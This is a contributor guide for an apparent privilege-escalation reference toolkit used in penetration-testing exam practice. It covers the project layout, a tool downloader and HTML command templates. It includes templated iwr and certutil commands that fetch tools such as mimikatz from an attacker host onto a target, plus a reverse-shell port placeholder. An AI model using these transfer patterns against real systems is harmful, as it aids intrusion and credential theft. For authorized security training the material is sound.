# MahiestaPrivEsc — Contributor & Maintenance Guide

This document explains the full architecture so any AI or developer can add tools,
commands, tips, or sections without breaking anything.

---

## Project Architecture

```
project1337/
├── privesc.html          ← The main single-file reference guide (HTML + CSS + JS)
├── ToolKitDownloader.py  ← Downloads/serves ALL tools; run this on Kali before an exam
├── Accesschk.ps1         ← Local bundled PS script (served from scripts/)
├── painkiller/           ← Legacy shell scripts (linpain.sh, painkillerV2.sh, etc.)
├── missing/              ← JSON data files for the guide's dynamic features
└── CONTRIBUTE.md         ← This file
```

**Workflow on exam day:**
```
python3 ToolKitDownloader.py          # downloads all tools → ~/privesc-toolkit/
                                      # starts HTTP server on random port
                                      # prints the port + target download commands
# Open http://<kali-ip>:<port>/privesc.html in browser
# Fill KALI_IP and PORT in the varbar — all commands auto-update
```

**Served directory structure** (everything under `~/privesc-toolkit/`):
```
~/privesc-toolkit/
├── windows/      ← Windows EXEs and extracted archive contents
├── scripts/      ← PowerShell scripts
├── linux/        ← Linux binaries and scripts
├── repos/        ← Git repos (cloned, not served directly)
└── privesc.html  ← Copy of the guide
```

---

## How to Add a New Downloadable Tool (EXE / Binary)

### Step 1 — Add to `ToolKitDownloader.py`

Open `ToolKitDownloader.py` and find the `TOOLS` dict. Add an entry to the right category:

```python
# In TOOLS["windows"] for Windows EXEs:
{"name": "MyTool.exe", "cat": "privesc", "url": "https://github.com/author/repo/releases/latest/download/MyTool.exe"},

# If it's a zip/archive that needs extraction:
{"name": "MyTool.zip", "cat": "privesc", "url": "https://github.com/.../MyTool.zip", "extract": True},

# In TOOLS["linux"] for Linux binaries:
{"name": "mytool", "cat": "enum", "url": "https://github.com/author/repo/releases/latest/download/mytool_linux_amd64"},

# In TOOLS["scripts"] for PowerShell scripts:
{"name": "MyScript.ps1", "cat": "privesc", "url": "https://raw.githubusercontent.com/author/repo/main/MyScript.ps1"},
```

**`cat` values** (for labelling, no functional impact):
`enum` · `privesc` · `potato` · `tokens` · `creds` · `ad` · `net` · `tunnel` · `shells` · `lateral` · `exploit-suggest` · `static` · `proc`

**For extracted archives** — the zip/gz is downloaded to `windows/MyTool.zip` and
extracted INTO `windows/`. The served path depends on what filenames are inside the archive.
Always check what the archive actually contains before writing the HTML path.

### Step 2 — Add to `TOOL_MAP` in `privesc.html`

Find `const TOOL_MAP = {` (around line 6180) and add:

```javascript
'MyTool.exe':'windows/MyTool.exe',          // Windows binary
'MyScript.ps1':'scripts/MyScript.ps1',      // PS script
'mytool':'linux/mytool',                    // Linux binary
// For archive-extracted files, use the EXTRACTED filename, not the zip name:
'mimikatz.exe':'windows/x64/mimikatz.exe',  // ← mimikatz_trunk.zip extracts to x64/ subfolder
```

**Critical rule:** The TOOL_MAP path must match the ACTUAL file that ends up on disk after
download/extraction. If a zip extracts into a subdirectory, reflect that in the path.
Check by running `ToolKitDownloader.py --list` and looking at what lands in `~/privesc-toolkit/`.

### Step 3 — Add to `TOOL_CATALOG` in `privesc.html`

Find `const TOOL_CATALOG = [` (around line 6220) and add an entry:

```javascript
// Windows EXE:
{n:'MyTool.exe', p:'windows/MyTool.exe', k:'win', c:'privesc'},

// PowerShell script:
{n:'MyScript.ps1', p:'scripts/MyScript.ps1', k:'ps', c:'privesc'},

// Linux binary:
{n:'mytool', p:'linux/mytool', k:'lin', c:'enum'},
```

Fields:
- `n` — filename (shown in the UI and used to build download commands)
- `p` — path relative to toolkit root (must match TOOL_MAP)
- `k` — kind: `'win'` / `'ps'` / `'lin'`
- `c` — category label (same values as ToolKitDownloader `cat`)

This is what powers the **⬇ Tools** modal in the topbar.

### Step 4 — Add Download Commands in the HTML Body

Find the relevant section in `privesc.html` and add a download block:

```html
<!-- Standard download block pattern: -->
<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download MyTool to target</div>
<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/MyTool.exe -Outfile {{WPATH}}\MyTool.exe</pre></div>
<div class="alts">
  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/MyTool.exe {{WPATH}}\MyTool.exe</code> — CMD (no PS)</div>
</div>
```

**Variable placeholders** — always use these, they auto-fill from the varbar:
| Placeholder | Example value | Meaning |
|---|---|---|
| `{{KALI_IP}}` | 10.10.14.1 | Kali attack IP |
| `{{PORT}}` | 46433 | Toolkit HTTP server port |
| `{{RPORT}}` | 4444 | Reverse shell listener port |
| `{{TARGET}}` | 192.168.45.10 | Target IP |
| `{{USER}}` | Administrator | Username |
| `{{PASS}}` | Password123 | Password |
| `{{DOMAIN}}` | corp.local | AD domain |
| `{{WPATH}}` | C:\Temp | Windows drop path |
| `{{LFILE}}` | /tmp/shell.sh | Linux target file path |

---

## How to Add a Local Bundled Script (no download URL)

Use this for scripts you write yourself (like `Accesschk.ps1`).

### Step 1 — Place the file in the project root

```
project1337/MyScript.ps1
```

### Step 2 — Add to ToolKitDownloader.py with `"local": True`

```python
# In TOOLS["scripts"]:
{"name": "MyScript.ps1", "cat": "privesc", "local": True},
```

The `copy_local_files()` function in `ToolKitDownloader.py` will copy it to
`~/privesc-toolkit/scripts/MyScript.ps1` every time the downloader runs.
No URL needed — it's served from your local copy.

### Steps 3 & 4 — Same as above (TOOL_MAP, TOOL_CATALOG, HTML body)

---

## How to Add a New HTML Section

Sections are inside `<div id="content">` in `privesc.html`.

### Section skeleton:

```html
<section class="section" id="your-section-id">
<div class="section-header">
  <div>
    <div class="section-num">8.5</div>
    <div class="section-title">Your Section Title</div>
    <div class="section-subtitle">Brief one-liner describing when to use this</div>
  </div>
  <div class="badges">
    <span class="badge badge-privesc">PRIVESC</span>
    <!-- badge-enum · badge-privesc · badge-exploit · badge-creds -->
  </div>
</div>

<!-- content goes here -->

</section>
```

### Add it to the sidebar

Find `<div id="sidebar">` and add a link in the right group:

```html
<a class="sb-item" href="#your-section-id">
  <span class="num">8.5</span>Your Section Title
  <span class="dot" data-sec="your-section-id" onclick="cycleProgress(event,'your-section-id')"></span>
</a>
```

The dot cycles: grey → orange (tried) → green (works) → red (skip). State is saved in localStorage.

---

## Content Block Reference

### Command block (copy-on-click, auto variable substitution)

```html
<div class="cmd-wrap">
  <div class="cmd-label">What this command does</div>
  <pre class="cmd">your command here with {{KALI_IP}} placeholders</pre>
</div>
```

### Alternative commands (shown below the main block)

```html
<div class="alts">
  <div class="alt-item">
    <span class="alt-arrow">&#8594;</span>
    <code class="alt-cmd">alternate command</code> — explanation
  </div>
</div>
```

### Subsection heading

```html
<div class="subsection">
  <div class="subsection-title">Sub-topic Name</div>
  <!-- commands go here -->
</div>
```

### Callout boxes

```html
<div class="callout callout-tip">
  <strong>Tip title</strong> Body text here.
</div>

<div class="callout callout-warn">
  <strong>Warning</strong> Careful about X.
</div>

<div class="callout callout-info">
  <strong>Info</strong> Context about this technique.
</div>

<div class="callout callout-danger">
  <strong>Danger</strong> This can brick the machine.
</div>
```

### Pipeline (step-by-step attack flow)

```html
<div class="pipeline">
  <div class="pipe-step pipe-detect">
    <span class="pipe-step-label">1. DETECT</span>
    <!-- commands -->
  </div>
  <div class="pipe-step pipe-confirm">
    <span class="pipe-step-label">2. CONFIRM</span>
  </div>
  <div class="pipe-step pipe-exploit">
    <span class="pipe-step-label">3. EXPLOIT</span>
  </div>
  <div class="pipe-step pipe-verify">
    <span class="pipe-step-label">4. VERIFY</span>
  </div>
  <div class="pipe-step pipe-kali">
    <span class="pipe-step-label">KALI — prepare</span>
  </div>
</div>
```

Pipe step colours: `pipe-detect`=yellow · `pipe-confirm`=cyan · `pipe-exploit`=red ·
`pipe-verify`=green · `pipe-backup`=teal · `pipe-restore`=orange · `pipe-kali`=purple

### Smart transfer block (auto-generates download commands when KALI_IP is set)

```html
<div class="auto-xfer" data-tools='["MyTool.exe","MyScript.ps1"]'>
  <div class="xfer-header" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='none'?'block':'none'">
    &#11015; Download these tools <span class="xfer-toggle">(expand)</span>
  </div>
  <div class="xfer-body" style="display:none"></div>
</div>
```

The tool names must exist in `TOOL_MAP`. Commands auto-populate when KALI_IP+PORT are set.

---

## Common Mistakes to Avoid

1. **Wrong server path for extracted archives** — if you download `Foo.zip` and it extracts
   to `windows/x64/foo.exe`, the HTML path must be `/windows/x64/foo.exe` NOT `/windows/foo.exe`.
   Always verify with `unzip -l Foo.zip` before writing the path.

2. **Missing `/windows/` or `/linux/` prefix** — all served paths are relative to the toolkit
   root. A file at `~/privesc-toolkit/windows/nc64.exe` is served as `/windows/nc64.exe`.
   Paths like `/nc64.exe` or `/SharpHound.exe` will 404.

3. **certutil on every machine** — certutil may be blocked/missing. Always provide an `iwr`
   (PowerShell) alternative AND a `(New-Object Net.WebClient).DownloadFile(...)` fallback.
   For Linux, provide both `wget` and `curl`.

4. **accesschk.exe /accepteula hang** — new Sysinternals versions pop a GUI. The toolkit
   serves the old v5.x from the zip. If in doubt, use `Accesschk.ps1` instead.

5. **TOOL_MAP vs TOOL_CATALOG divergence** — both must have the same path for a given tool.
   If you update one, update the other. TOOL_MAP powers the smart `auto-xfer` blocks;
   TOOL_CATALOG powers the ⬇ Tools modal.

6. **Forgetting `"extract": True`** — if you add a zip/gz/tar.gz and don't set this, only
   the archive file will be served, not the extracted binary.

---

## Adding a Tip to an Existing Section

Just drop a callout anywhere inside a `<section>`:

```html
<div class="callout callout-tip">
  <strong>Pro tip: something the reader might miss</strong>
  Explanation of the non-obvious thing.
</div>
```

No registration needed. Callouts render inline.

---

## Updating the Decision Tree / Compat Table

These are driven by JSON files in `missing/`:
- `missing/decision_tree.json` — the interactive privesc decision tree
- `missing/os_compat.json` — the OS × exploit compatibility table
- `missing/vectors_win.json` — Windows privesc vectors for the SI parser
- `missing/vectors_lin.json` — Linux privesc vectors

Edit the JSON to add new nodes/entries. The JS in `privesc.html` reads these at page load
(they're embedded inline during build — search for the JSON variable names in the `<script>`
section to find where they're inlined).

---

## Quick Checklist for Adding a New Tool

- [ ] Add entry to `TOOLS["windows"|"scripts"|"linux"]` in `ToolKitDownloader.py`
- [ ] Verify the actual extracted filename (for archives)
- [ ] Add `'filename':'path/filename'` to `TOOL_MAP` in `privesc.html`
- [ ] Add `{n,p,k,c}` entry to `TOOL_CATALOG` in `privesc.html`
- [ ] Add download commands (iwr + certutil alts) in the relevant HTML section
- [ ] If local script: place file in project root and use `"local": True`
- [ ] Test: run `ToolKitDownloader.py --serve-only` and curl the path to verify it 200s
